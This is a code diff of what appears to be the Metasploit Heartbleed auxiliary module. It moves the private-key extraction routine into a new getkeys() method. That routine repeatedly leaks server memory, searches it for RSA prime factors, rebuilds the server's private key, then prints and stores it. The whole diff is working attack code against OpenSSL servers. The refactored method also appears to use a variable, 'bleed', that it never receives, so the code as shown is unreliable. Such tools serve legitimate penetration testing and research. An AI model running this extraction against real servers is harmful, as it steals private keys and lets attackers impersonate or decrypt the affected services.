@@ -260,45 +260,7 @@ class Metasploit3 < Msf::Auxiliary
     when 'DUMP'
       scan(bleed)  # Scan & Dump are similar, scan() records results
     when 'KEYS'
-      unless datastore['TLS_CALLBACKS'] == 'None'
-        print_error('TLS callbacks currently unsupported for keydumping action') #TODO
-        return
-      end
-      print_status("#{peer} - Scanning for private keys")
-      count = 0
-
-      print_status("#{peer} - Getting public key constants...")
-      n, e = get_ne
-      vprint_status("#{peer} - n: #{n}")
-      vprint_status("#{peer} - e: #{e}")
-      print_status("#{peer} - #{Time.now.getutc} - Starting.")
-
-      datastore['MAX_KEYTRIES'].times {
-        # Loop up to MAX_KEYTRIES times, looking for keys
-        if count % datastore['STATUS_EVERY'] == 0
-          print_status("#{peer} - #{Time.now.getutc} - Attempt #{count}...")
-        end
-
-        p, q = get_factors(bleed, n) # Try to find factors in mem
-        unless p.nil? || q.nil?
-          key = key_from_pqe(p, q, e)
-          print_good("#{peer} - #{Time.now.getutc} - Got the private key")
-
-         print_status(key.export)
-          path = store_loot(
-            "openssl.heartbleed.server",
-            "text/plain",
-            rhost,
-            key.export,
-            nil,
-            "OpenSSL Heartbleed Private Key"
-          )
-          print_status("#{peer} - Private key stored in #{path}")
-          return
-        end
-        count += 1
-      }
-      print_error("#{peer} - Private key not found. You can try to increase MAX_KEYTRIES.")
+      getkeys()
     else
       #Shouldn't get here, since Action is Enum
       print_error("Unknown Action: #{action.name}")
@@ -383,6 +345,49 @@ class Metasploit3 < Msf::Auxiliary
         vprint_error("#{peer} - Looks like there isn't leaked information...")
       end
     end
+
+  def getkeys()
+    unless datastore['TLS_CALLBACKS'] == 'None'
+      print_error('TLS callbacks currently unsupported for keydumping action') #TODO
+      return
+    end
+   
+    print_status("#{peer} - Scanning for private keys")
+    count = 0
+
+    print_status("#{peer} - Getting public key constants...")
+    n, e = get_ne
+    vprint_status("#{peer} - n: #{n}")
+    vprint_status("#{peer} - e: #{e}")
+    print_status("#{peer} - #{Time.now.getutc} - Starting.")
+
+    datastore['MAX_KEYTRIES'].times {
+      # Loop up to MAX_KEYTRIES times, looking for keys
+      if count % datastore['STATUS_EVERY'] == 0
+        print_status("#{peer} - #{Time.now.getutc} - Attempt #{count}...")
+      end
+
+      p, q = get_factors(bleed, n) # Try to find factors in mem
+      unless p.nil? || q.nil?
+        key = key_from_pqe(p, q, e)
+        print_good("#{peer} - #{Time.now.getutc} - Got the private key")
+
+       print_status(key.export)
+        path = store_loot(
+          "openssl.heartbleed.server",
+          "text/plain",
+          rhost,
+          key.export,
+          nil,
+          "OpenSSL Heartbleed Private Key"
+        )
+        print_status("#{peer} - Private key stored in #{path}")
+        return
+      end
+      count += 1
+    }
+    print_error("#{peer} - Private key not found. You can try to increase MAX_KEYTRIES.")
+  end 
 
   def heartbeat(length)
     payload = "\x01"              # Heartbeat Message Type: Request (1)
